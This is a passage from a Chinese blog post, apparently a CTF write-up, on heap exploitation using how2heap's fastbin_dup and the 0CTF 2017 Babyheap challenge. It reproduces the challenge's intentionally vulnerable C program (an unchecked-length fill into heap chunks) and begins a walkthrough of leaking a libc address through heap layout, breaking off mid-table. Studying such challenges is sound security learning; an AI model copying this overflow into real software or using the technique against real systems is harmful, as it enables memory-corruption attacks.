<!DOCTYPE html>
<html >
<head>

    <!-- hexo-inject:begin --><!-- hexo-inject:end --><!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no" />
<meta name="author" content="Hcamael" />



<meta name="description" content="最近在学习堆, 看了how2heap上的fastbin_dup，例子都还挺简单的，然后学做了下0CTF 2017的Babyheap，然后开启了新大陆，发现我以前根本就不会Pwn……">
<meta name="keywords" content="bin">
<meta property="og:type" content="article">
<meta property="og:title" content="堆溢出学习之0CTF 2017 Babyheap">
<meta property="og:url" content="http://0x48.pw/2017/08/01/0x36/index.html">
<meta property="og:site_name" content="Hc1m1">
<meta property="og:description" content="最近在学习堆, 看了how2heap上的fastbin_dup，例子都还挺简单的，然后学做了下0CTF 2017的Babyheap，然后开启了新大陆，发现我以前根本就不会Pwn……">
<meta property="og:updated_time" content="2017-08-01T16:49:03.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="堆溢出学习之0CTF 2017 Babyheap">
<meta name="twitter:description" content="最近在学习堆, 看了how2heap上的fastbin_dup，例子都还挺简单的，然后学做了下0CTF 2017的Babyheap，然后开启了新大陆，发现我以前根本就不会Pwn……">

<link rel="apple-touch-icon" href= "/apple-touch-icon.png">


    <link rel="alternate" href="/rss.xml" title="Hc1m1" type="application/atom+xml">



    <link rel="shortcut icon" href="/img/favicon.png">



    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">



    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">



    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">


<link rel="stylesheet" href="/css/style.css">



<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>堆溢出学习之0CTF 2017 Babyheap | Hc1m1</title>

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: true,
        animate: true,
        isHome: false,
        isPost: true,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: undefined
    }
</script>


    <script>
        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
    </script>



    <script> yiliaConfig.rootUrl = "\/";</script>





    <script>
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "//hm.baidu.com/hm.js?4b6b8b9a09d24f4d4e26c50bd1707fd7";
            var s = document.getElementsByTagName("script")[0]; 
            s.parentNode.insertBefore(hm, s);
        })();
    </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->


</head>
<body>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/img/author.png" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">Hcamael</a></h1>
        </hgroup>

        
        <p class="header-subtitle">Blog</p>
        

        


        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">主页</a></li>
                        
                            <li><a href="/archives/">所有文章</a></li>
                        
                            <li><a href="/tags/">标签云</a></li>
                        
                            <li><a href="/about/">关于我</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" href="mailto: baiyjrh@gmail.com" title="Email"></a>
                            
                                <a class="fa GitHub" href="https://github.com/Hcamael" title="GitHub"></a>
                            
                                <a class="fa RSS" href="/rss.xml" title="RSS"></a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GIT/">GIT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pentest/">Pentest</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RE/">RE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQLi/">SQLi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bin/">bin</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/network/">network</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/old-blog/">old_blog</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/research/">research</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sb/">sb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/share/">share</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/随笔/">随笔</a></li></ul>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a class="main-nav-link switch-friends-link" href="http://vidar.club">Vidar-Team</a>
                    
                      <a class="main-nav-link switch-friends-link" href="https://wiki.vidar.club/doku.php">wiki</a>
                    
                      <a class="main-nav-link switch-friends-link" href="https://drops.vidar.club/">Drops</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://lightless.me">lightless</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://homeway.me">夏日小草</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://www.edwardl.xyz">Edward_L</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://aklis.info">Aklis</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://libc.pw">Explorer</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://lorexxar.cn">Lorexxar</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://misty.moe/">Misty</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://www.venenof.com/">Veneno</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://www.wupco.cn">Wupco</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://www.scanfsec.com">scanf</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://repwn.com">Bird</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://pzhxbz.cn">pzhxbz</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://veritas501.space/">veritas</a>
                    
                    </div>
                </section>
                

                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">HDUISA, web狗, 菜鸡H, 正在向bin爷爷努力前进</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Hcamael</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/img/author.png" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">Hcamael</a></h1>
            </hgroup>
            
            <p class="header-subtitle">Blog</p>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">主页</a></li>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                    <li><a href="/tags/">标签云</a></li>
                
                    <li><a href="/about/">关于我</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a>
                            
                                <a class="fa GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a>
                            
                                <a class="fa RSS" target="_blank" href="/rss.xml" title="RSS"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
</nav>
      <div class="body-wrap"><article id="post-0x36" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2017/08/01/0x36/" class="article-date">
      <time datetime="2017-08-01T14:12:10.000Z" itemprop="datePublished">2017-08-01</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      堆溢出学习之0CTF 2017 Babyheap
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        

        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/bin/">bin</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>最近在学习堆, 看了<a href="https://github.com/shellphish/how2heap" target="_blank" rel="external">how2heap</a>上的<code>fastbin_dup</code>，例子都还挺简单的，然后学做了下0CTF 2017的Babyheap，然后开启了新大陆，发现我以前根本就不会Pwn……</p>
<a id="more"></a>
<h1 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h1><p>先说下how2heap上的例子，一个是<a href="https://github.com/shellphish/how2heap/blob/master/fastbin_dup.c" target="_blank" rel="external">fastbin_dup.c</a>还有一个是<a href="https://github.com/shellphish/how2heap/blob/master/fastbin_dup_into_stack.c" target="_blank" rel="external">fastbin_dup_into_stack</a></p>
<p>其实这两个例子挺简单的，看懂我上一篇讲fastbin的blog，对着代码看看应该很容易理解，第一个其实就是演示下fastbin的2free，第二个是演示利用fastbin的2free，malloc出一个特定的地址，很简单的，其实就是通过修改fastbin的fd，太简单了就不多讲了…</p>
<h1 id="Babyheap"><a href="#Babyheap" class="headerlink" title="Babyheap"></a>Babyheap</h1><p>题目我github上有: <a href="https://github.com/Hcamael/CTF_repo/tree/master/0CTF%202017/Pwn10(Baby%20Heap%202017)" target="_blank" rel="external">https://github.com/Hcamael/CTF_repo/tree/master/0CTF%202017/Pwn10(Baby%20Heap%202017)</a></p>
<p>这题是有个libc库的，这题的难点在哪？我觉得就是开了PIE保护，地址随机化，之前我blog中做的那些题我们是可以知道bin中的地址的，比如<code>got</code>表，<code>plt</code>表啊，<code>.bss</code>或者<code>.data</code>里啥变量的地址啊，那都是在没开PIE的情况，当开了PIE，任何地址我们都是未知的。</p>
<p>还有一个难点就是调试不好调试(我最近从peda换成了pwndbg)，有两个难点，首先是有个alarm，每次调试的时候都要跳过执行这个函数，要不然就在bin中patch掉这个函数，还有个应该是因为PIE的原因，调用一个函数的时候pwndbg没办法帮我显示函数命了，害我还要去查这个函数是malloc还是free。这两个太影响我调试的进度了，所以我根据bin复现了一个逻辑相同的源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">long</span> <span class="keyword">int</span> <span class="built_in">list</span>[<span class="number">16</span>*<span class="number">3</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"1. Allocate"</span>);</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"2. Fill"</span>);</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"3. Free"</span>);</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"4. Dump"</span>);</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"5. Exit"</span>);</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Command: "</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_str</span><span class="params">(<span class="keyword">char</span> *s, <span class="keyword">int</span> len)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> tmp, x, r;</div><div class="line">    <span class="keyword">char</span> buf;</div><div class="line">    <span class="keyword">if</span> (len)&#123;</div><div class="line">        tmp = <span class="number">0</span>;</div><div class="line">        <span class="keyword">while</span>(len<span class="number">-1</span> &gt; tmp)&#123;</div><div class="line">            x = read(<span class="number">0</span>, &amp;buf, <span class="number">1</span>);</div><div class="line">            <span class="keyword">if</span> (x&gt;<span class="number">0</span>)&#123;</div><div class="line">                <span class="keyword">if</span>(buf==<span class="number">10</span>)</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                *(s+tmp) = buf;</div><div class="line">                tmp++;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span></div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">        *(s+tmp) = <span class="number">0</span>;</div><div class="line">        r = tmp;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">        r = <span class="number">0</span>;</div><div class="line">    <span class="keyword">return</span> r;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">long</span> <span class="title">read_int</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">char</span> s[<span class="number">8</span>];</div><div class="line">    read_str(&amp;s, <span class="number">8</span>);</div><div class="line">    <span class="keyword">return</span> atol(s);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">alloca_chunk</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">long</span> <span class="keyword">int</span> n;</div><div class="line">    <span class="keyword">char</span> *add;</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;=<span class="number">15</span>; i++)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (!<span class="built_in">list</span>[i*<span class="number">24</span>])&#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"Size: "</span>);</div><div class="line">            n = read_int();</div><div class="line">            <span class="keyword">if</span>(n &gt; <span class="number">0</span>)</div><div class="line">            &#123;</div><div class="line">                <span class="keyword">if</span> (n &gt; <span class="number">4096</span>)</div><div class="line">                    n = <span class="number">4096</span>;</div><div class="line">                add = <span class="built_in">calloc</span>(n, <span class="number">1</span>);</div><div class="line">                <span class="keyword">if</span> (!add)</div><div class="line">                    <span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line">                <span class="built_in">list</span>[<span class="number">24</span>*i] = <span class="number">1</span>;</div><div class="line">                <span class="built_in">list</span>[<span class="number">24</span>*i + <span class="number">8</span>] = n;</div><div class="line">                <span class="built_in">list</span>[<span class="number">24</span>*i + <span class="number">16</span>] = add;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"Allocate Index %d\n"</span>, i);</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line">    &#125; </div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">long</span> <span class="title">fill_data</span><span class="params">(<span class="keyword">long</span> index, <span class="keyword">long</span> len)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">long</span> n, m, r;</div><div class="line">    <span class="keyword">if</span>(len)&#123;</div><div class="line">        n = <span class="number">0</span>;</div><div class="line">        <span class="keyword">while</span> (n &lt; len)&#123;</div><div class="line">            m = read(<span class="number">0</span>, <span class="built_in">list</span>[index*<span class="number">24</span>+<span class="number">16</span>], len-n);</div><div class="line">            <span class="keyword">if</span> (m &gt; <span class="number">0</span>)</div><div class="line">                n += m;</div><div class="line">            <span class="keyword">else</span></div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">        r = n;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">        r = <span class="number">0</span>;</div><div class="line">    <span class="keyword">return</span> r;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">fill_chunk</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">long</span> result, index;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</div><div class="line">    result = read_int();</div><div class="line">    index = result;</div><div class="line">    <span class="keyword">if</span> ((result &amp; <span class="number">0x80000000</span>) == <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">15</span>)</div><div class="line">    &#123;</div><div class="line">        result = <span class="built_in">list</span>[result*<span class="number">24</span>];</div><div class="line">        <span class="keyword">if</span> (result == <span class="number">1</span>)&#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"Size: "</span>);</div><div class="line">            result = read_int();</div><div class="line">            <span class="keyword">if</span> (result &gt; <span class="number">0</span>)&#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"Content: "</span>);</div><div class="line">                result = fill_data(index, result);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_chunk</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">long</span> r, index;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</div><div class="line">    r = read_int();</div><div class="line">    index = r;</div><div class="line">    <span class="keyword">if</span> (r &gt;= <span class="number">0</span> &amp;&amp; r &lt;= <span class="number">15</span>)&#123;</div><div class="line">        r = <span class="built_in">list</span>[index*<span class="number">24</span>];</div><div class="line">        <span class="keyword">if</span> (r == <span class="number">1</span>)&#123;</div><div class="line">            <span class="built_in">list</span>[index*<span class="number">24</span>] = <span class="number">0</span>;</div><div class="line">            <span class="built_in">list</span>[index*<span class="number">24</span>+<span class="number">8</span>] = <span class="number">0</span>;</div><div class="line">            <span class="built_in">free</span>(<span class="built_in">list</span>[index*<span class="number">24</span>+<span class="number">16</span>]);</div><div class="line">            <span class="built_in">list</span>[index*<span class="number">24</span>+<span class="number">16</span>] = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">long</span> <span class="title">write_data</span><span class="params">(<span class="keyword">long</span> addr, <span class="keyword">long</span> len)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> n;</div><div class="line">    <span class="keyword">int</span> s;</div><div class="line">    n = <span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span>(n &lt; len)</div><div class="line">    &#123;</div><div class="line">        s = write(<span class="number">1</span>, addr+n, len-n);</div><div class="line">        <span class="keyword">if</span> (s &gt; <span class="number">0</span>)</div><div class="line">        &#123;</div><div class="line">            n += s;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">            <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> n;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dump_chunk</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">long</span> r, index;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</div><div class="line">    r = read_int();</div><div class="line">    index = r;</div><div class="line">    <span class="keyword">if</span> (r &gt;=<span class="number">0</span> &amp;&amp; r &lt;=<span class="number">15</span>)</div><div class="line">    &#123;</div><div class="line">        r = <span class="built_in">list</span>[index*<span class="number">24</span>];</div><div class="line">        <span class="keyword">if</span> (r == <span class="number">1</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="built_in">puts</span>(<span class="string">"Content: "</span>);</div><div class="line">            write_data(<span class="built_in">list</span>[index*<span class="number">24</span>+<span class="number">16</span>], <span class="built_in">list</span>[index*<span class="number">24</span>+<span class="number">8</span>]);</div><div class="line">            <span class="built_in">puts</span>(<span class="string">""</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> n;</div><div class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</div><div class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</div><div class="line">    <span class="keyword">for</span>(;;)&#123;</div><div class="line">        menu();</div><div class="line">        n = read_int();</div><div class="line">        <span class="keyword">switch</span>(n)&#123;</div><div class="line">            <span class="keyword">case</span> <span class="number">1</span>: alloca_chunk(); <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="number">2</span>: fill_chunk(); <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="number">3</span>: free_chunk(); <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="number">4</span>: dump_chunk(); <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="number">5</span>: <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我还原的代码和bin差别还是挺多的，但是4个函数的逻辑基本相同，还原这个代码只是为了方便我调试，所以并不开PIE，然后调试的时候当做我开了😏</p>
<p>我总结了下，这题已经可以分为三个姿势</p>
<p>PS: calloc和malloc是差不多的，区别很小，具体的自行google</p>
<h2 id="leak-libc-address"><a href="#leak-libc-address" class="headerlink" title="leak libc address"></a>leak libc address</h2><p>第一步基本都是想着泄露地址，这题利用堆有一个泄露libc地址的姿势</p>
<p>首先，先简单的说，一个small bin，它的fd和bk会指向top chunk(剩下的small bin, large bin, unsortbin还有一个remainder我之后应该也会写blog)，指向的不是top chunk的地址，而是指向top chunk指针，再详细点就是，在arena中有一个地方存放的是top chunk的地址，在fastbin之后remainder之前(上一篇讲fastbin的应该有提及到)，而fd和bk就是会指向这个地址，而arena是位于libc的<code>.data</code>区域，所以arena的地址也就是libc的地址，而我们有了libc库，所以也能算出其他地址。</p>
<p>在这之前，还得解决一个问题，就是怎么输出fd或者是bk，当free了之后就没法dump了。所以这里就得利用到之前提到的<code>fatbin_dup</code>了</p>
<p>现在就来详细的说下，首先，malloc出下面这样的堆空间</p>
<table>
<thead>
<tr>
<th style="text-align:center">地址</th>
<th style="text-align:center">0-8 byte</th>
<th style="text-align:center">9-f byte</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">id:0/0x00</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x21</td>
</tr>
<tr>
<td style="text-align:center">0x10</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">id:1/0x20</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x21</td>
</tr>
<tr>
<td style="text-align:center">0x30</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">id:2/0x40</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x21</td>
</tr>
<tr>
<td style="text-align:center">0x50</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">id:3/0x60</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x91</td>
</tr>
<tr>
<td style="text-align:center">0x70</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">id:4/0xf0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x91</td>
</tr>
</tbody>
</table>
<p>首先是malloc出3个fast chunk和两个small chuank，small chunk这里malloc出两个是因为如果free的small chunk下面是top chunk，则触发unlink合并机制，也就没有啥fd和bk了，所以malloc出两个，然后free第一个</p>
<p>这里还有一个问题，上面表中的地址我可不是乱写的，因为要页对齐的原因，我们虽然不知道malloc的具体地址空间，但是我们却能知道最后一个byte的值就是我上面标的这样的</p>
<p>第一步我们先free(2)，然后我们再free(1)，这个时候的堆是这样的：</p>
<table>
<thead>
<tr>
<th style="text-align:center">地址</th>
<th style="text-align:center">0-8 byte</th>
<th style="text-align:center">9-f byte</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">id:0/0x00</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x21</td>
</tr>
<tr>
<td style="text-align:center">0x10</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">0x20</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x21</td>
</tr>
<tr>
<td style="text-align:center">0x30</td>
<td style="text-align:center">0x40</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">0x40</td>
